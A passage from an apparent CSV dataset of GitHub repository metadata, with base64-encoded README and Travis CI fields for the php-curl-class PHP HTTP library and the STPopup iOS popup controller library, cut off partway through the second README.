name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
dHJ1Y3QoKQpDdXJsOjpfX2dldCgkbmFtZSkKQ3VybDo6YXR0ZW1wdFJldHJ5
KCkKQ3VybDo6YmVmb3JlU2VuZCgkY2FsbGJhY2spCkN1cmw6OmJ1aWxkUG9z
dERhdGEoJGRhdGEpCkN1cmw6OmNhbGwoKQpDdXJsOjpjbG9zZSgpCkN1cmw6
OmNvbXBsZXRlKCRjYWxsYmFjaykKQ3VybDo6ZGVsZXRlKCR1cmwsICRxdWVy
eV9wYXJhbWV0ZXJzID0gYXJyYXkoKSwgJGRhdGEgPSBhcnJheSgpKQpDdXJs
Ojpkb3dubG9hZCgkdXJsLCAkbWl4ZWRfZmlsZW5hbWUpCkN1cmw6OmVycm9y
KCRjYWxsYmFjaykKQ3VybDo6ZXhlYygkY2ggPSBudWxsKQpDdXJsOjpleGVj
RG9uZSgpCkN1cmw6OmdldCgkdXJsLCAkZGF0YSA9IGFycmF5KCkpCkN1cmw6
OmdldEF0dGVtcHRzKCkKQ3VybDo6Z2V0QmVmb3JlU2VuZENhbGxiYWNrKCkK
Q3VybDo6Z2V0Q29tcGxldGVDYWxsYmFjaygpCkN1cmw6OmdldENvb2tpZSgk
a2V5KQpDdXJsOjpnZXRDdXJsKCkKQ3VybDo6Z2V0Q3VybEVycm9yQ29kZSgp
CkN1cmw6OmdldEN1cmxFcnJvck1lc3NhZ2UoKQpDdXJsOjpnZXREb3dubG9h
ZENvbXBsZXRlQ2FsbGJhY2soKQpDdXJsOjpnZXREb3dubG9hZEZpbGVOYW1l
KCkKQ3VybDo6Z2V0RXJyb3JDYWxsYmFjaygpCkN1cmw6OmdldEVycm9yQ29k
ZSgpCkN1cmw6OmdldEVycm9yTWVzc2FnZSgpCkN1cmw6OmdldEZpbGVIYW5k
bGUoKQpDdXJsOjpnZXRIdHRwRXJyb3JNZXNzYWdlKCkKQ3VybDo6Z2V0SHR0
cFN0YXR1c0NvZGUoKQpDdXJsOjpnZXRJZCgpCkN1cmw6OmdldEluZm8oJG9w
dCA9IG51bGwpCkN1cmw6OmdldEpzb25EZWNvZGVyKCkKQ3VybDo6Z2V0T3B0
KCRvcHRpb24pCkN1cmw6OmdldFJhd1Jlc3BvbnNlKCkKQ3VybDo6Z2V0UmF3
UmVzcG9uc2VIZWFkZXJzKCkKQ3VybDo6Z2V0UmVtYWluaW5nUmV0cmllcygp
CkN1cmw6OmdldFJlcXVlc3RIZWFkZXJzKCkKQ3VybDo6Z2V0UmVzcG9uc2Uo
KQpDdXJsOjpnZXRSZXNwb25zZUNvb2tpZSgka2V5KQpDdXJsOjpnZXRSZXNw
b25zZUNvb2tpZXMoKQpDdXJsOjpnZXRSZXNwb25zZUhlYWRlcnMoKQpDdXJs
OjpnZXRSZXRyaWVzKCkKQ3VybDo6Z2V0UmV0cnlEZWNpZGVyKCkKQ3VybDo6
Z2V0U3VjY2Vzc0NhbGxiYWNrKCkKQ3VybDo6Z2V0VXJsKCkKQ3VybDo6Z2V0
WG1sRGVjb2RlcigpCkN1cmw6OmhlYWQoJHVybCwgJGRhdGEgPSBhcnJheSgp
KQpDdXJsOjppc0NoaWxkT2ZNdWx0aUN1cmwoKQpDdXJsOjppc0N1cmxFcnJv
cigpCkN1cmw6OmlzRXJyb3IoKQpDdXJsOjppc0h0dHBFcnJvcigpCkN1cmw6
Om9wdGlvbnMoJHVybCwgJGRhdGEgPSBhcnJheSgpKQpDdXJsOjpwYXRjaCgk
dXJsLCAkZGF0YSA9IGFycmF5KCkpCkN1cmw6OnBvc3QoJHVybCwgJGRhdGEg
PSAnJywgJGZvbGxvd18zMDNfd2l0aF9wb3N0ID0gZmFsc2UpCkN1cmw6OnBy
b2dyZXNzKCRjYWxsYmFjaykKQ3VybDo6cHV0KCR1cmwsICRkYXRhID0gYXJy
YXkoKSkKQ3VybDo6cmVtb3ZlSGVhZGVyKCRrZXkpCkN1cmw6OnJlc2V0KCkK
Q3VybDo6c2VhcmNoKCR1cmwsICRkYXRhID0gYXJyYXkoKSkKQ3VybDo6c2V0
QmFzaWNBdXRoZW50aWNhdGlvbigkdXNlcm5hbWUsICRwYXNzd29yZCA9ICcn
KQpDdXJsOjpzZXRDb25uZWN0VGltZW91dCgkc2Vjb25kcykKQ3VybDo6c2V0
Q29va2llKCRrZXksICR2YWx1ZSkKQ3VybDo6c2V0Q29va2llRmlsZSgkY29v
a2llX2ZpbGUpCkN1cmw6OnNldENvb2tpZUphcigkY29va2llX2phcikKQ3Vy
bDo6c2V0Q29va2llU3RyaW5nKCRzdHJpbmcpCkN1cmw6OnNldENvb2tpZXMo
JGNvb2tpZXMpCkN1cmw6OnNldERlZmF1bHREZWNvZGVyKCRtaXhlZCA9ICdq
c29uJykKQ3VybDo6c2V0RGVmYXVsdEpzb25EZWNvZGVyKCkKQ3VybDo6c2V0
RGVmYXVsdFRpbWVvdXQoKQpDdXJsOjpzZXREZWZhdWx0VXNlckFnZW50KCkK
Q3VybDo6c2V0RGVmYXVsdFhtbERlY29kZXIoKQpDdXJsOjpzZXREaWdlc3RB
dXRoZW50aWNhdGlvbigkdXNlcm5hbWUsICRwYXNzd29yZCA9ICcnKQpDdXJs
OjpzZXRIZWFkZXIoJGtleSwgJHZhbHVlKQpDdXJsOjpzZXRIZWFkZXJzKCRo
ZWFkZXJzKQpDdXJsOjpzZXRKc29uRGVjb2RlcigkbWl4ZWQpCkN1cmw6OnNl
dE1heEZpbGVzaXplKCRieXRlcykKQ3VybDo6c2V0T3B0KCRvcHRpb24sICR2
YWx1ZSkKQ3VybDo6c2V0T3B0cygkb3B0aW9ucykKQ3VybDo6c2V0UG9ydCgk
cG9ydCkKQ3VybDo6c2V0UHJveHkoJHByb3h5LCAkcG9ydCA9IG51bGwsICR1
c2VybmFtZSA9IG51bGwsICRwYXNzd29yZCA9IG51bGwpCkN1cmw6OnNldFBy
b3h5QXV0aCgkYXV0aCkKQ3VybDo6c2V0UHJveHlUdW5uZWwoJHR1bm5lbCA9
IHRydWUpCkN1cmw6OnNldFByb3h5VHlwZSgkdHlwZSkKQ3VybDo6c2V0UmVm
ZXJlcigkcmVmZXJlcikKQ3VybDo6c2V0UmVmZXJyZXIoJHJlZmVycmVyKQpD
dXJsOjpzZXRSZXRyeSgkbWl4ZWQpCkN1cmw6OnNldFRpbWVvdXQoJHNlY29u
ZHMpCkN1cmw6OnNldFVybCgkdXJsLCAkbWl4ZWRfZGF0YSA9ICcnKQpDdXJs
OjpzZXRVc2VyQWdlbnQoJHVzZXJfYWdlbnQpCkN1cmw6OnNldFhtbERlY29k
ZXIoJG1peGVkKQpDdXJsOjpzdWNjZXNzKCRjYWxsYmFjaykKQ3VybDo6dW5z
ZXRIZWFkZXIoJGtleSkKQ3VybDo6dW5zZXRQcm94eSgpCkN1cmw6OnZlcmJv
c2UoJG9uID0gdHJ1ZSwgJG91dHB1dCA9IFNUREVSUikKTXVsdGlDdXJsOjpf
X2NvbnN0cnVjdCgkYmFzZV91cmwgPSBudWxsKQpNdWx0aUN1cmw6Ol9fZGVz
dHJ1Y3QoKQpNdWx0aUN1cmw6OmFkZEN1cmwoQ3VybCAkY3VybCkKTXVsdGlD
dXJsOjphZGREZWxldGUoJHVybCwgJHF1ZXJ5X3BhcmFtZXRlcnMgPSBhcnJh
eSgpLCAkZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkRG93bmxvYWQo
JHVybCwgJG1peGVkX2ZpbGVuYW1lKQpNdWx0aUN1cmw6OmFkZEdldCgkdXJs
LCAkZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkSGVhZCgkdXJsLCAk
ZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkT3B0aW9ucygkdXJsLCAk
ZGF0YSA9IGFycmF5KCkpCk11bHRpQ3VybDo6YWRkUGF0Y2goJHVybCwgJGRh
dGEgPSBhcnJheSgpKQpNdWx0aUN1cmw6OmFkZFBvc3QoJHVybCwgJGRhdGEg
PSAnJywgJGZvbGxvd18zMDNfd2l0aF9wb3N0ID0gZmFsc2UpCk11bHRpQ3Vy
bDo6YWRkUHV0KCR1cmwsICRkYXRhID0gYXJyYXkoKSkKTXVsdGlDdXJsOjph
ZGRTZWFyY2goJHVybCwgJGRhdGEgPSBhcnJheSgpKQpNdWx0aUN1cmw6OmJl
Zm9yZVNlbmQoJGNhbGxiYWNrKQpNdWx0aUN1cmw6OmNsb3NlKCkKTXVsdGlD
dXJsOjpjb21wbGV0ZSgkY2FsbGJhY2spCk11bHRpQ3VybDo6ZXJyb3IoJGNh
bGxiYWNrKQpNdWx0aUN1cmw6OmdldE9wdCgkb3B0aW9uKQpNdWx0aUN1cmw6
OnJlbW92ZUhlYWRlcigka2V5KQpNdWx0aUN1cmw6OnNldEJhc2ljQXV0aGVu
dGljYXRpb24oJHVzZXJuYW1lLCAkcGFzc3dvcmQgPSAnJykKTXVsdGlDdXJs
OjpzZXRDb25jdXJyZW5jeSgkY29uY3VycmVuY3kpCk11bHRpQ3VybDo6c2V0
Q29ubmVjdFRpbWVvdXQoJHNlY29uZHMpCk11bHRpQ3VybDo6c2V0Q29va2ll
KCRrZXksICR2YWx1ZSkKTXVsdGlDdXJsOjpzZXRDb29raWVGaWxlKCRjb29r
aWVfZmlsZSkKTXVsdGlDdXJsOjpzZXRDb29raWVKYXIoJGNvb2tpZV9qYXIp
Ck11bHRpQ3VybDo6c2V0Q29va2llU3RyaW5nKCRzdHJpbmcpCk11bHRpQ3Vy
bDo6c2V0Q29va2llcygkY29va2llcykKTXVsdGlDdXJsOjpzZXREaWdlc3RB
dXRoZW50aWNhdGlvbigkdXNlcm5hbWUsICRwYXNzd29yZCA9ICcnKQpNdWx0
aUN1cmw6OnNldEhlYWRlcigka2V5LCAkdmFsdWUpCk11bHRpQ3VybDo6c2V0
SGVhZGVycygkaGVhZGVycykKTXVsdGlDdXJsOjpzZXRKc29uRGVjb2Rlcigk
bWl4ZWQpCk11bHRpQ3VybDo6c2V0T3B0KCRvcHRpb24sICR2YWx1ZSkKTXVs
dGlDdXJsOjpzZXRPcHRzKCRvcHRpb25zKQpNdWx0aUN1cmw6OnNldFBvcnQo
JHBvcnQpCk11bHRpQ3VybDo6c2V0UHJveGllcygkcHJveGllcykKTXVsdGlD
dXJsOjpzZXRQcm94eSgkcHJveHksICRwb3J0ID0gbnVsbCwgJHVzZXJuYW1l
ID0gbnVsbCwgJHBhc3N3b3JkID0gbnVsbCkKTXVsdGlDdXJsOjpzZXRQcm94
eUF1dGgoJGF1dGgpCk11bHRpQ3VybDo6c2V0UHJveHlUdW5uZWwoJHR1bm5l
bCA9IHRydWUpCk11bHRpQ3VybDo6c2V0UHJveHlUeXBlKCR0eXBlKQpNdWx0
aUN1cmw6OnNldFJlZmVyZXIoJHJlZmVyZXIpCk11bHRpQ3VybDo6c2V0UmVm
ZXJyZXIoJHJlZmVycmVyKQpNdWx0aUN1cmw6OnNldFJldHJ5KCRtaXhlZCkK
TXVsdGlDdXJsOjpzZXRUaW1lb3V0KCRzZWNvbmRzKQpNdWx0aUN1cmw6OnNl
dFVybCgkdXJsKQpNdWx0aUN1cmw6OnNldFVzZXJBZ2VudCgkdXNlcl9hZ2Vu
dCkKTXVsdGlDdXJsOjpzZXRYbWxEZWNvZGVyKCRtaXhlZCkKTXVsdGlDdXJs
OjpzdGFydCgpCk11bHRpQ3VybDo6c3VjY2VzcygkY2FsbGJhY2spCk11bHRp
Q3VybDo6dW5zZXRIZWFkZXIoJGtleSkKTXVsdGlDdXJsOjp1bnNldFByb3h5
KCkKTXVsdGlDdXJsOjp2ZXJib3NlKCRvbiA9IHRydWUsICRvdXRwdXQgPSBT
VERFUlIpCmBgYAoKIyMjIFNlY3VyaXR5CgpTZWUgW1NFQ1VSSVRZXShodHRw
czovL2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwtY2xhc3Mv
YmxvYi9tYXN0ZXIvU0VDVVJJVFkubWQpIGZvciBzZWN1cml0eSBjb25zaWRl
cmF0aW9ucy4KCiMjIyBUcm91Ymxlc2hvb3RpbmcKClNlZSBbVFJPVUJMRVNI
T09USU5HXShodHRwczovL2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhw
LWN1cmwtY2xhc3MvYmxvYi9tYXN0ZXIvVFJPVUJMRVNIT09USU5HLm1kKSBm
b3IgdHJvdWJsZXNob290aW5nLgoKIyMjIFJ1biBUZXN0cwoKVG8gcnVuIHRl
c3RzOgoKICAgICQgZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9waHAt
Y3VybC1jbGFzcy9waHAtY3VybC1jbGFzcy5naXQKICAgICQgY2QgcGhwLWN1
cmwtY2xhc3MvCiAgICAkIGNvbXBvc2VyIHVwZGF0ZQogICAgJCAuL3Rlc3Rz
L3J1bi5zaAoKVG8gcnVuIHNlbGVjdCB0ZXN0czoKCiAgICAkIGdpdCBjbG9u
ZSBodHRwczovL2dpdGh1Yi5jb20vcGhwLWN1cmwtY2xhc3MvcGhwLWN1cmwt
Y2xhc3MuZ2l0CiAgICAkIGNkIHBocC1jdXJsLWNsYXNzLwogICAgJCBjb21w
b3NlciB1cGRhdGUKICAgICQgLi90ZXN0cy9ydW4uc2ggLS1maWx0ZXI9a2V5
d29yZAoKVG8gdGVzdCBhbGwgUEhQIHZlcnNpb25zIGluIGNvbnRhaW5lcnM6
CgogICAgJCBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3BocC1jdXJs
LWNsYXNzL3BocC1jdXJsLWNsYXNzLmdpdAogICAgJCBjZCBwaHAtY3VybC1j
bGFzcy8KICAgICQgLi90ZXN0cy90ZXN0X2FsbC5zaAoKIyMjIENvbnRyaWJ1
dGUKCjEuIENoZWNrIGZvciBvcGVuIGlzc3VlcyBvciBvcGVuIGEgbmV3IGlz
c3VlIHRvIHN0YXJ0IGEgZGlzY3Vzc2lvbiBhcm91bmQgYSBidWcgb3IgZmVh
dHVyZS4KMS4gRm9yayB0aGUgcmVwb3NpdG9yeSBvbiBHaXRIdWIgdG8gc3Rh
cnQgbWFraW5nIHlvdXIgY2hhbmdlcy4KMS4gV3JpdGUgb25lIG9yIG1vcmUg
dGVzdHMgZm9yIHRoZSBuZXcgZmVhdHVyZSBvciB0aGF0IGV4cG9zZSB0aGUg
YnVnLgoxLiBNYWtlIGNvZGUgY2hhbmdlcyB0byBpbXBsZW1lbnQgdGhlIGZl
YXR1cmUgb3IgZml4IHRoZSBidWcuCjEuIFNlbmQgYSBwdWxsIHJlcXVlc3Qg
dG8gZ2V0IHlvdXIgY2hhbmdlcyBtZXJnZWQgYW5kIHB1Ymxpc2hlZC4K
",,"bGFuZ3VhZ2U6IHBocAoKbWF0cml4OgogIGFsbG93X2ZhaWx1cmVzOgogICAg
LSBwaHA6IDUuNAogICAgLSBwaHA6IDUuNQogICAgLSBwaHA6IDUuNgogICAg
LSBwaHA6IGhodm0KICAgIC0gcGhwOiBoaHZtLW5pZ2h0bHkKICAgIC0gcGhw
OiBuaWdodGx5CiAgaW5jbHVkZToKICAgIC0gcGhwOiA1LjMKICAgICAgZGlz
dDogcHJlY2lzZQogICAgLSBwaHA6IDUuNAogICAgICBkaXN0OiB0cnVzdHkK
ICAgIC0gcGhwOiA1LjUKICAgICAgZGlzdDogdHJ1c3R5CiAgICAtIHBocDog
NS42CiAgICAgIGRpc3Q6IHRydXN0eQogICAgLSBwaHA6IDcuMAogICAgICBk
aXN0OiB0cnVzdHkKICAgIC0gcGhwOiA3LjEKICAgICAgZGlzdDogdHJ1c3R5
CiAgICAtIHBocDogNy4yCiAgICAgIGRpc3Q6IHRydXN0eQogICAgLSBwaHA6
IDcuMwogICAgICBkaXN0OiB0cnVzdHkKICAgIC0gcGhwOiBoaHZtCiAgICAg
IGRpc3Q6IHRydXN0eQogICAgLSBwaHA6IGhodm0tbmlnaHRseQogICAgICBk
aXN0OiB0cnVzdHkKICAgIC0gcGhwOiBuaWdodGx5CiAgICAgIGRpc3Q6IHRy
dXN0eQoKYmVmb3JlX3NjcmlwdDoKICAtIGJhc2ggdGVzdHMvYmVmb3JlX3Nj
cmlwdC5zaAoKc2NyaXB0OgogIC0gYmFzaCB0ZXN0cy9zY3JpcHQuc2gK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'STPopup',42387347,"b""STPopup provides STPopupController, which works just like UINavigationController in popup style, for both iPhone and iPad. It's written in Objective-C and compatible with Swift.""",b'Objective-C',28,2379,,2379,False,b'https://api.github.com/repos/kevin0571/STPopup/forks',"IyBTVFBvcHVwICFbQ0kgU3RhdHVzXShodHRwczovL2ltZy5zaGllbGRzLmlv
L3RyYXZpcy9rZXZpbjA1NzEvU1RQb3B1cC5zdmc/c3R5bGU9ZmxhdCkgIVtW
ZXJzaW9uXShodHRwOi8vaW1nLnNoaWVsZHMuaW8vY29jb2Fwb2RzL3YvU1RQ
b3B1cC5zdmc/c3R5bGU9ZmxhZykgIVtMaWNlbnNlXShodHRwczovL2ltZy5z
aGllbGRzLmlvL2NvY29hcG9kcy9sL1NUUG9wdXAuc3ZnP3N0eWxlPWZsYWcp
CmBTVFBvcHVwYCBwcm92aWRlcyBgU1RQb3B1cENvbnRyb2xsZXJgLCB3aGlj
aCB3b3JrcyBqdXN0IGxpa2UgYFVJTmF2aWdhdGlvbkNvbnRyb2xsZXJgIGlu
IHBvcHVwIHN0eWxlLCBmb3IgYm90aCBpUGhvbmUgYW5kIGlQYWQuIEl0J3Mg
d3JpdHRlbiBpbiBPYmplY3RpdmUtQyBhbmQgY29tcGF0aWJsZSB3aXRoIFN3
aWZ0LgoKKipGZWF0dXJlczoqKgotIFB1c2gvUG9wIHZpZXcgY29udHJvbGxl
ciBpbnRvL291dCBvZiBgU1RQb3B1cENvbnRyb2xsZXJgIGp1c3QgbGlrZSBg
VUlOYXZpZ2F0aW9uQ29udHJvbGxlcmAuCi0gU2V0IG5hdmlnYXRpb24gaXRl
bXMgdGhyb3VnaCBgc2VsZi5uYXZpZ2F0aW9uSXRlbWAganVzdCBsaWtlIHVz
aW5nIGEgYFVJTmF2aWdhdGlvbkNvbnRyb2xsZXJgLgotIFN1cHBvcnQgYm90
aCAiRm9ybSBTaGVldCIgYW5kICJCb3R0b20gU2hlZXQiIHN0eWxlLgotIFdv
cmsgd2VsbCB3aXRoIHN0b3J5Ym9hcmQoaW5jbHVkaW5nIHNlZ3VlKS4KLSBD
dXN0b21pemUgVUkgYnkgdXNpbmcgYFVJQXBwZWFyYW5jZWAuCi0gQ3VzdG9t
aXphYmxlIHBvcHVwIHRyYW5zaXRpb24gc3R5bGUuCi0gQXV0by1yZXBvc2l0
aW9uIG9mIHBvcHVwIHZpZXcgd2hlbiBrZXlib2FyZCBzaG93cyB1cCwgbWFr
ZSBzdXJlIHlvdXIgYFVJVGV4dEZpZWxkYC9gVUlUZXh0Vmlld2Agd29uJ3Qg
YmUgY292ZXJlZCBieSB0aGUga2V5Ym9hcmQuCi0gRHJhZyBuYXZpZ2F0aW9u
IGJhciB0byBkaXNtaXNzIHBvcHVwIHZpZXcuCi0gU3VwcG9ydCBib3RoIHBv
cnRyYWl0IGFuZCBsYW5kc2NhcGUgb3JpZW50YXRpb24gaW4gaVBob25lIGFu
ZCBpUGFkLgotIGlPUyA3Ky4KLSBDb21wYXRpYmxlIHdpdGggU3dpZnQuCgoj
IyBVc2UgQ2FzZXMKIVtVc2UgQ2FzZXNdKGh0dHBzOi8vdXNlci1pbWFnZXMu
Z2l0aHVidXNlcmNvbnRlbnQuY29tLzE0OTEyODIvNTc5ODU2OTYtYjZlMDEz
MDAtN2E2My0xMWU5LTkxYTktYjVhYTU1MjYyOTY3LmpwZykKCiMjIEdldCBT
dGFydGVkCioqQ29jb2FQb2RzKioKYGBgcnVieQpwb2QgJ1NUUG9wdXAnCmBg
YAoqKkNhcnRoYWdlKioKYGBgcnVieQpnaXRodWIgImtldmluMDU3MS9TVFBv
cHVwIgpgYGAKICAKKipJbXBvcnQgaGVhZGVyIGZpbGUqKiAgCk9iamVjdGl2
ZS1DCmBgYG9iamMKI2ltcG9ydCA8U1RQb3B1cC9TVFBvcHVwLmg+CmBgYApT
d2lmdApgYGBzd2lmdAppbXBvcnQgU1RQb3B1cApgYGAKCioqSW5pdGlhbGl6
ZSBhbmQgcHJlc2VudCBTVFBvcHVwQ29udHJvbGxlcioqICAKT2JqZWN0aXZl
LUMKYGBgb2JqYwpTVFBvcHVwQ29udHJvbGxlciAqcG9wdXBDb250cm9sbGVy
ID0gW1tTVFBvcHVwQ29udHJvbGxlciBhbGxvY10gaW5pdFdpdGhSb290Vmll
d0NvbnRyb2xsZXI6dmlld0NvbnRyb2xsZXJdOwpbcG9wdXBDb250cm9sbGVy
IHByZXNlbnRJblZpZXdDb250cm9sbGVyOnNlbGZdOwpgYGAKU3dpZnQKYGBg
c3dpZnQKbGV0IHBvcHVwQ29udHJvbGxlciA9IGxldCBwb3B1cENvbnRyb2xs
ZXIgPSBTVFBvcHVwQ29udHJvbGxlcihyb290Vmlld0NvbnRyb2xsZXI6IHZp
ZXdDb250cm9sbGVyKQpwb3B1cENvbnRyb2xsZXIucHJlc2VudChpbjogc2Vs
ZikKYGBgCgoqKlNldCBjb250ZW50IHNpemUgaW4gdmlldyBjb250cm9sbGVy
KiogIApPYmplY3RpdmUtQwpgYGBvYmpjCkBpbXBsZW1lbnRhdGlvbiBWaWV3
Q29udHJvbGxlcgoKLSAoaW5zdGFuY2V0eXBlKWluaXQKewogICAgaWYgKHNl
bGYgPSBbc3VwZXIgaW5pdF0pIHsKICAgICAgICBzZWxmLnRpdGxlID0gQCJW
aWV3IENvbnRyb2xsZXIiOwogICAgICAgIHNlbGYubmF2aWdhdGlvbkl0ZW0u
cmlnaHRCYXJCdXR0b25JdGVtID0gW1tVSUJhckJ1dHRvbkl0ZW0gYWxsb2Nd
IGluaXRXaXRoVGl0bGU6QCJOZXh0IiBzdHlsZTpVSUJhckJ1dHRvbkl0ZW1T
dHlsZVBsYWluIHRhcmdldDpzZWxmIGFjdGlvbjpAc2VsZWN0b3IobmV4dEJ0
bkRpZFRhcCldOwogICAgICAgIC8vIEl0J3MgcmVxdWlyZWQgdG8gc2V0IGNv
bnRlbnQgc2l6ZSBvZiBwb3B1cC4KICAgICAgICBzZWxmLmNvbnRlbnRTaXpl
SW5Qb3B1cCA9IENHU2l6ZU1ha2UoMzAwLCA0MDApOwogICAgICAgIHNlbGYu
bGFuZHNjYXBlQ29udGVudFNpemVJblBvcHVwID0gQ0dTaXplTWFrZSg0MDAs
IDIwMCk7CiAgICB9CiAgICByZXR1cm4gc2VsZjsKfQoKQGVuZApgYGAKU3dp
ZnQKYGBgc3dpZnQKY2xhc3MgVmlld0NvbnRyb2xsZXI6IFVJVmlld0NvbnRy
b2xsZXIgewogICAgb3ZlcnJpZGUgaW5pdChuaWJOYW1lIG5pYk5hbWVPck5p
bDogU3RyaW5nPywgYnVuZGxlIG5pYkJ1bmRsZU9yTmlsOiBCdW5kbGU/KSB7
CiAgICAgICAgc3VwZXIuaW5pdChuaWJOYW1lOiBuaWJOYW1lT3JOaWwsIGJ1
bmRsZTogbmliQnVuZGxlT3JOaWwpCiAgICAgICAgdGl0bGUgPSAiVmlldyBD
b250cm9sbGVyIgogICAgICAgIG5hdmlnYXRpb25JdGVtLnJpZ2h0QmFyQnV0
dG9uSXRlbSA9IFVJQmFyQnV0dG9uSXRlbSh0aXRsZTogIk5leHQiLCBzdHls
ZTogLnBsYWluLCB0YXJnZXQ6IHNlbGYsIGFjdGlvbjogI3NlbGVjdG9yKG5l
eHRCdG5EaWRUYXApKQogICAgICAgIC8vIEl0J3MgcmVxdWlyZWQgdG8gc2V0
IGNvbnRlbnQgc2l6ZSBvZiBwb3B1cC4KICAgICAgICBjb250ZW50U2l6ZUlu
UG9wdXAgPSBDR1NpemUod2lkdGg6IDMwMCwgaGVpZ2h0OiA0MDApCiAgICAg
ICAgbGFuZHNjYXBlQ29udGVudFNpemVJblBvcHVwID0gQ0dTaXplKHdpZHRo
OiA0MDAsIGhlaWdodDogMjAwKQogICAgfQp9CmBgYAoqKlNldCBjb250ZW50
IHNpemUgb2YgdmlldyBjb250cm9sbGVyIHdoaWNoIGlzIGxvYWRlZCBmcm9t
IFN0b3J5Ym9hcmQqKiAgClNldCBjb250ZW50IHNpemUgaW4gc3Rvcnlib2Fy
ZCBvciBpbiBgYXdha2VGcm9tTmliYC4gIAohW1N0b3J5Ym9hcmRdKGh0dHBz
Oi8vdXNlci1pbWFnZXMuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzE0OTEyODIv
NTc5ODIzOTQtZGNhNWYxODAtN2EzYy0xMWU5LThkNjMtM2NhNmMzODM3ODYw
LnBuZykKCioqUHVzaCwgcG9wIGFuZCBkaXNtaXNzIHZpZXcgY29udHJvbGxl
cnMqKiAgCk9iamVjdGl2ZS1DCmBgYG9iamMKW3NlbGYucG9wdXBDb250cm9s
bGVyIHB1c2hWaWV3Q29udHJvbGxlcjpbVmlld0NvbnRyb2xsZXIgbmV3XSBh
bmltYXRlZDpZRVNdOwpbc2VsZi5wb3B1cENvbnRyb2xsZXIgcG9wVmlld0Nv
bnRyb2xsZXJBbmltYXRlZDpZRVNdOyAvLyBQb3B1cCB3aWxsIGJlIGRpc21p
c3NlZCBpZiB0aGVyZSBpcyBvbmx5IG9uZSB2aWV3IGNvbnRyb2xsZXIgaW4g
dGhlIHBvcHVwIHZpZXcgY29udHJvbGxlciBzdGFjawpbc2VsZi5wb3B1cENv
bnRyb2xsZXIgZGlzbWlzc107CmBgYApTd2lmdApgYGBzd2lmdApwb3B1cENv
bnRyb2xsZXI/LnB1c2godmlld0NvbnRyb2xsZXIsIGFuaW1hdGVkOiB0cnVl
KQpwb3B1cENvbnRyb2xsZXI/LnBvcFZpZXdDb250cm9sbGVyKGFuaW1hdGVk
